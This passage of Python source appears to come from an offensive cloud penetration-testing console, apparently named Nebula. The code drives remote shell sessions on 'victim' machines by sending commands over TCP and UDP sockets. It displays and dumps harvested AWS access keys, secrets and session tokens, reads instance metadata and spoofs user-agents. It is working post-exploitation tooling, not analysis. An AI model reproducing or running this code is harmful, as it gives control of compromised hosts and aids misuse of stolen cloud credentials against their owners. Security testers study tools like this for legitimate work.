                                    awssess['region'] = creds['region']
                                    all_sessions.append(awssess)

                                    print(
                                        colored(
                                            "\t{}".format(creds['profile']),
                                            "green")
                                    )
                                    for k,v in creds.items():
                                        print(
                                                "\t\t{}:{}".format(
                                                    colored(k, "red"),
                                                    colored(v, "blue")
                                                )
                                        )
                                    print(
                                        colored(
                                            "\t--------------------------------",
                                            "yellow")
                                    )

                                    #for awsprofile in (check_env_dict['AWS_CREDS']):

                                for ak in keys:
                                    print(colored("Profile '{}' saved on credentials".format(ak), "green"))

                                print("{} '{}' {}".format(
                                    colored('Use',"yellow"),
                                    colored('show credentails',"green"),
                                    colored('to check the new credentials',"yellow"),
                                ))
                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )
                            metadata = check_env_dict['META-DATA']
                            if metadata['status-code'] == 200 or metadata['status-code'] == 401:
                                global output
                                n_tab = 0

                                if isinstance(metadata, list):
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    output += colored("{}\n".format("META-DATA"), "yellow", attrs=['bold'])
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    for data in metadata:
                                        list_dictionary(data, n_tab)
                                        output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                elif isinstance(metadata, dict):
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    output += colored("{}\n".format("META-DATA"), "yellow", attrs=['bold'])
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    list_dictionary(metadata, n_tab)
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                print(output)
                                output = ""

                            elif metadata['status-code'] == 404:
                                print(
                                    colored("[*] No access to Meta-Data. Sorry :'( ", "red")
                                )

                            else:
                                print(
                                    colored("[*] No access to Meta-Data. Sorry :'( ", "red")
                                )

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                            print(
                                colored(
                                    "Output saved to file '{}'".format(
                                        colored("./workspaces/{}/{}/{}".format(workspace, particle, check_env_file), "blue")
                                    ),
                                    "green")
                            )

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                        elif (command.split(" ")[1]).strip() == 'cd':
                            if (command.split(" ")[1:]) == "":
                                print(colored("Please enter a directory to go to."))
                            else:
                                cmd = ""
                                for c in (command.split(" ")[1:]):
                                    cmd += c + " "

                        else:
                            if "_tcp_" in particles[particle]['module']:
                                cmd = ""
                                for c in (command.split(" ")[1:]):
                                    cmd += c + " "

                                shell.send(cmd.encode())
                                response = shell.recv(20480).decode()
                                if response == "":
                                    print()
                                print(response)

                            if "_udp_" in particles[particle]['module']:
                                cmd = ""
                                addr = particles[particle]['IP']
                                port = particles[particle]['Port']

                                print(addr + ":" + str(port))

                                for c in (command.split(" ")[1:]):
                                    cmd += c + " "

                                shell.sendto(cmd.encode(), (addr, port))
                                resp = shell.recvfrom(20480)
                                print(resp[0])

                    except IOError as e:
                        print(
                            colored("[*] Connection closed by the victim machine!", "red")
                        )
                        del comms['use']['particle'][particle]
                        particles[particle]['socket'] = None
                        del particles[particle]
                        #del p[particle]
                        particle = ""
                        shell.close()
                    except:
                        #print("error")
                        #ty, val, tb = sys.exc_info()
                        #print(
                        #"Error: %s,%s,%s" % (
                        #    ty.__name__,
                        #    os.path.split(tb.tb_frame.f_code.co_filename)[1], tb.tb_next.tb_lineno
                        #))
                        #print("error")
                        e = sys.exc_info()
                        print(colored("[*] {}".format(e), "red"))

            elif command.split(" ")[0] == "options":
                if module_char == "":
                    print(colored("[*] Choose a module first.","red"))

                else:
                    print (colored("Desctiption:","yellow",attrs=["bold"]))
                    print (colored("-----------------------------","yellow",attrs=["bold"]))
                    print (colored("\t{}".format(imported_module.description),"green"))

                    print(colored("\nAuthor:", "yellow", attrs=["bold"]))
                    print(colored("-----------------------------", "yellow", attrs=["bold"]))
                    for x, y in imported_module.author.items():
                        print("\t{}:\t{}".format(colored(x, "red"), colored(y, "blue")))

                    print()
                    print("{}: {}".format(colored("Needs Credentials", "yellow", attrs=["bold"]),
                                          colored(imported_module.needs_creds, "green")))
                    print(colored("-----------------------------", "yellow", attrs=["bold"]))

                    print(colored("\nAWSCLI Command:", "yellow", attrs=["bold"]))
                    print(colored("---------------------"
                                  "--------", "yellow", attrs=["bold"]))
                    aws_comm = imported_module.aws_command
                    print("\t" + aws_comm)

                    print(colored("\nOptions:", "yellow", attrs=["bold"]))
                    print(colored("-----------------------------","yellow",attrs=["bold"]))
                    for key,value in imported_module.variables.items():
                        if (value['required']).lower() == "true":
                            print("\t{}:\t{}\n\t\t{}: {}\n\t\t{}: {}".format(colored(key,"red"),colored(value['value'],"blue"),colored("Required","yellow"), colored(value['required'],"green"), colored("Description","yellow"), colored(value['description'],"green")))

                        elif (value['required']).lower() == "false":
                            print("\t{}:\t{}\n\t\t{}: {}\n\t\t{}: {}".format(colored(key,"red"),colored(value['value'],"blue"),colored("Required","yellow"), colored(value['required'],"green"), colored("Description","yellow"), colored(value['description'],"green")))

                        else:
                            print("\t{}:\t{}".format(colored(key, "red"), colored(value['value'], "blue")))
                        print()

            elif command == 'insert':
                print(colored("Option 'insert' is used with another option. Use help for more.", "red"))

            elif command.split(" ")[0] == 'insert':
                if command.split(" ")[1] == 'credentials':
                    profile_name = ""
                    if len(command.split(" ")) == 2:
                        profile_name = input("Profile Name: ")
                    elif len(command.split(" ")) > 2:
                        print("Profile Name: {}".format(command.split(" ")[2]))
                        profile_name = command.split(" ")[2]

                    access_key_id = input("Access Key ID: ")
                    secret_key = input("Secret Key ID: ")
                    region = input("Region: ")

                    sess_test['profile'] = str(profile_name)
                    sess_test['access_key_id'] = str(access_key_id)
                    sess_test['secret_key'] = str(secret_key)
                    sess_test['region'] = str(region)
                    yon = input("\nDo you also have a session token?[y/N] ")
                    if yon == 'y' or yon == 'Y':
                        sess_token = input("Session Token: ")
                        sess_test['session_token'] = sess_token

                    comms['use']['credentials'][profile_name] = None

                    if sess_test['profile'] == "" and sess_test['access_key_id'] == "" and sess_test['secret_key'] == "" and sess_test['region'] == "":
                        pass

                    else:
                        cred_prof = sess_test['profile']
                        all_sessions.append(copy.deepcopy(sess_test))

                    print (colored("[*] Credentials set. Use ","green") + colored("'show credentials' ","blue") + colored("to check them.","green"))
                    print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))

            elif command == 'set':
                print(colored("Option 'set' is used with another option. Use help for more.","red"))

            elif command.split(" ")[0] == 'set':
                if command.split(" ")[1] == 'credentials':
                    profile_name = ""
                    if len(command.split(" ")) == 2:
                        profile_name = input("Profile Name: ")
                    elif len(command.split(" ")) > 2:
                        print("Profile Name: {}".format(command.split(" ")[2]))
                        profile_name = command.split(" ")[2]

                    access_key_id = input("Access Key ID: ")
                    secret_key = input("Secret Key ID: ")
                    region = input("Region: ")

                    sess_test['profile'] = str(profile_name)
                    sess_test['access_key_id'] = str(access_key_id)
                    sess_test['secret_key'] = str(secret_key)
                    sess_test['region'] = str(region)
                    yon = input("\nDo you also have a session token?[y/N] ")
                    if yon == 'y' or yon == 'Y':
                        sess_token = input("Session Token: ")
                        sess_test['session_token'] = sess_token

                    comms['use']['credentials'][profile_name] = None

                    if sess_test['profile'] == "" and sess_test['access_key_id'] == "" and sess_test['secret_key'] == "" and sess_test['region'] == "":
                        pass

                    else:
                        cred_prof = sess_test['profile']
                        all_sessions.append(copy.deepcopy(sess_test))

                    print (colored("[*] Credentials set. Use ","green") + colored("'show credentials' ","blue") + colored("to check them.","green"))
                    print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))

                elif command.split(" ")[1] == 'user-agent':
                    if len(command.split(' ')) < 3 or len(command.split('"')) > 3:
                        print(colored("[*] Usage: set user-agent <linux | windows | custom>","red"))

                    elif len(command.split(' ')) == 3:
                        ua = command.split(' ')[2].lower()

                        if ua == "linux":
                            useragent = random.choice(user_agents_linux)
                        elif ua == "windows":
                            useragent = random.choice(user_agents_windows)
                        elif ua == "custom":
                            useragent = input("Enter the User-Agent you want: ")
                        else:
                            print(colored("[*] Usage: set user-agent <linux | windows | custom>", "red"))

                        print(colored("User Agent: {} was set".format(useragent),"green"))

                else:
                    if module_char == "":
                        print(colored("[*] Choose a module first.","red"))

                    elif len(command.split(" ")) < 3:
                        print (colored("[*] The right form is: set <OPTION> <VALUE>","red"))

                    elif (command.split(" ")[1]).upper() == 'SERVICE':
                        print(colored("[*] You can't change service.", "red"))

                    else:
                        count = 1
                        for key, value in imported_module.variables.items():
                            argument = ((command.split(" ")[1]).upper()).strip()
                            if key == argument:
                                count = 0
                                imported_module.variables[key]['value'] = command.split(" ")[2]
                                break

                        if count == 1:
                            print(colored("[*] That option does not exist on this module","red"))

            elif command.split(" ")[0] == 'unset':
                if (command.split(" ")[1]).lower() == 'user-agent':
                    useragent = ""
                    print(colored("[*] User Agent set to empty.", "green"))

                elif (command.split(" ")[1]).lower() == 'particle':
                    shell = None
                    particle = ""

                else:
                    if module_char == "":
                        print(colored("[*] Choose a module first.","red"))

                    elif len(command.split(" ")) > 2:
                        print (colored("[*] The right form is: unset <OPTION>","red"))

                    elif (command.split(" ")[1]).upper() == 'SERVICE':
                        print(colored("[*] You can't change service.", "red"))

                    else:
                        count = 1
                        for key, value in imported_module.variables.items():
                            argument = ((command.split(" ")[1]).upper()).strip()
                            if key == argument:
                                count = 0
                                imported_module.variables[key]['value'] = ""
                                break

                        if count == 1:
                            print(colored("[*] That option does not exist on this module","red"))

            elif command.split(" ")[0] == 'show':
                if command.split(" ")[1] == 'credentials':
                    print(json.dumps(all_sessions, indent=4, default=str))

                elif command.split(" ")[1] == 'sockets':
                    if not sockets:
                        print(colored("[*] No socket is available","yellow", attrs=['bold']))
                    else:
                        print(colored("----------------------------------------------------------------------",
                                      "yellow"))
                        for key,value in sockets.items():
                            if value['socket'] == None:
                                continue
                            else:
                                if value['type'] == "SOCK_STREAM":
                                    type = "TCP"
                                elif value['type'] == "SOCK_DGRAM":
                                    type = "UDP"
                                else:
                                    type = value['type']
                                print("Socket {}: type: {} | protocol: {} | module: {}".format(
                                    colored(key, "blue"),
                                    colored(value['addr'], "blue"),
                                    colored(type, "blue"),
                                    colored(value['module'], "blue")
                                ))
                        print(colored("----------------------------------------------------------------------",
                                      "yellow"))
                elif command.split(" ")[1] == 'particles':
                    if not particles:
                        print(colored("[*] You have no current sessions!\n", "yellow"))
                    else:
                        print(colored("--------------------------------------------------------------------------------------------", "yellow"))
                        for name,part in particles.items():
                                print("Session {} | {} | {} | {} | {} | {} | {} | {}".format(
                                    colored(name, "red"),
                                    colored(part['IP'], "yellow"),
                                    colored(part['Hostname'], "yellow"),
                                    colored(part['LAN_IP'], "green"),
                                    colored(part['Port'], "magenta"),
                                    colored(part['OS'], "cyan"),
                                    colored(part['User'], "yellow"),
                                    colored(part['module'], "blue")
                                ))

                        print(colored("--------------------------------------------------------------------------------------------", "yellow"))

                elif command.split(" ")[1] == "workspaces":
                    print(colored("-----------------------------------", "yellow"))
                    print("{}:".format(colored("Workspaces", "yellow")))
                    print(colored("-----------------------------------", "yellow"))
                    for w in workspaces:
                        print("\t{}".format(w))
                    print()

                elif (command.split(" ")[1]).lower() == 'user-agent':
                    if useragent == "":
                        print("{}".format(colored("[*] User Agent is empty.", "green")))
                    else:
                        print("{}: {}".format(colored("[*] User Agent is", "green"), colored(useragent, "yellow")))

                elif command.split(" ")[1] == 'current-creds':
                    for sess in all_sessions:
                        if sess['profile'] == cred_prof:
                            print(json.dumps(sess, indent=4, default=str))

                elif command.split(" ")[1] == 'modules':
                    for module in show:
                        arr = os.listdir("./module/" + module)
                        for x in arr:
                            if "__" in x:
                                continue
                            elif ".git" in x:
                                continue
                            else:
                                List = []
                                list2 = []
                                indention = 80
                                max_line_length = 60

                                mod = module + "/" + x.split(".py")[0]
                                thedir = mod.split("/")[0]
                                sys.path.insert(0, "./module/" + thedir)
                                imported_module = __import__(mod.split("/")[1])
                                list2.append("\t{}".format(colored(mod, "blue")))
                                list2.append("\t{}".format(colored(imported_module.description, "yellow")))
                                List.append(list2)

                                for i in range(len(List)):
                                    out = List[i][0].ljust(indention, ' ')
                                    cur_indent = 0
                                    for line in List[i][1].split('\n'):
                                        for short_line in textwrap.wrap(line, max_line_length):
                                            out += ' ' * cur_indent + short_line.lstrip() + "\n"
                                            cur_indent = indention
                                        print(out)

                                List = []
                                list2 = []


                elif command.split(" ")[1] in show:
                    terminal = colored(command.split(" ")[1],"blue")
                    arr = os.listdir("./module/" + command.split(" ")[1])
                    for x in arr:
                        if "__" in x:
                            continue
                        elif ".git" in x:
                            continue
                        else:
                            List = []
                            list2 = []
                            indention = 80
                            max_line_length = 60

                            mod = command.split(" ")[1] + "/" + x.split(".py")[0]
                            thedir = mod.split("/")[0]
                            if "\\" in thedir:
                                thedir = thedir.replace("\\","/")
                            sys.path.insert(0, "./module/" + thedir)
                            imported_module = __import__(mod.split("/")[1])
                            list2.append("\t{}".format(colored(mod, "blue")))
                            list2.append("\t{}".format(colored(imported_module.description, "yellow")))
                            List.append(list2)

                            for i in range(len(List)):
                                out = List[i][0].ljust(indention, ' ')
                                cur_indent = 0
                                for line in List[i][1].split('\n'):
                                    for short_line in textwrap.wrap(line, max_line_length):
                                        out += ' ' * cur_indent + short_line.lstrip() + "\n"
                                        cur_indent = indention
                                    print(out)
                            List = []
                            list2 = []
                            out = ""
                else:
                    print (colored("[*] '{}' is not a valid command".format(command.split(" ")[1]), "red"))

            elif command.split(" ")[0] == 'dump':
                if len(command.split(" ")) < 2:
                    print(colored("[*] Correct command is 'dump credentials'", "red"))

                if command.split(" ")[1] == 'credentials':
                    if not all_sessions:
                        print(colored("[*] You have no credentials at the moment. Pease add some first, then save them latter.", "red"))
                    else:
                        now = datetime.now()
                        dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")
                        if not os.path.exists('./credentials'):
                            os.makedir('./credentials')

                        with open("./credentials/{}".format(dt_string), 'w') as outfile:
                            json.dump(all_sessions, outfile)
                            print(colored("[*] Credentials dumped on file '{}'.".format("./credentials/{}".format(dt_string)), "green"))
                else:
                    print(colored("[*] Correct command is 'dump credentials'", "red"))

            elif command.split(" ")[0] == 'import':
                if command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Usage: import credentials <cred name>","red"))
                    else:
                        if "/" in command.split(" ")[2] or "\\" in command.split(" ")[2]:
                            print(colored("[*] Just enter the credential file name, not the whole path. That being said, no \\ or / should be on the file name.","red"))
                        else:
                            with open("./credentials/{}".format(command.split(" ")[2]), 'r') as outfile:
                                sessions = json.load(outfile)
                                for s in sessions:
                                    name = s['profile']
                                    comms['use']['credentials'][name] = None
                                    all_sessions.append(s)

                else:
                    print(colored("[*] Correct command is 'import credentials'.", "red"))

            elif command == 'getuid':
                ready = False
                if cred_prof == "":
                    print(
                        colored("[*] Please choose a set of credentials first using 'use credentials <name>'.", "red"))
                else:
                    ready = True

                if workspace == "":
                    print(
                        colored("[*] Please choose a workspace first using 'use workspace <name>'.", "red"))

                if ready:
                    for sess in all_sessions:
                        if sess['profile'] == cred_prof:
                            getuid(sess, workspace)

            else:
                try:
                    if system == 'Windows':
                        command = "powershell.exe " + command
                        out = os.popen(command).read()
                        print(out)
                    elif system == 'Linux' or system == 'Darwin':
                        out = os.popen(command).read()
                        print(out)
                except:
                    print (colored("[*] '{}' is not a valid command.".format(command), "red"))

            com = "({})({})({}) >>> ".format(colored(workspace,"green"),colored(particle,"red"), terminal)

            history_file = FileHistory(".nebula-history-file")
            session = PromptSession(history=history_file)
            for x in workspaces:
                comms['remove']['workspace'][x] = None
            completer = NestedCompleter.from_nested_dict(comms)
            command = session.prompt(
                ANSI(
                    com
                ),
                completer=completer,
                complete_style=CompleteStyle.READLINE_LIKE
            )
            command.strip()
    except KeyboardInterrupt:
        command = input(
            colored("Are you sure you want to exit? [y/N] ", "red")
        )
        if command == "Y" or command == "y":
            if sockets:
                for key,value in sockets.items():
                    s = value['socket']
                    s.shutdown(2)
                    s.close()

                print("All socket closed!")
            exit()
            sys.exit()

        main(workspace, particle, module_char, p, sockets)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-b", action='store_true', help="Do not print banner")
    args = parser.parse_args()

    if args.b:
        print(colored("-------------------------------------------------------------", "green"))
        banner.module_count_without_banner()
        print(colored("-------------------------------------------------------------\n", "green"))
    else:
        banner.banner()

    p = {}
    main(workspace, particle, terminal, p, sockets)
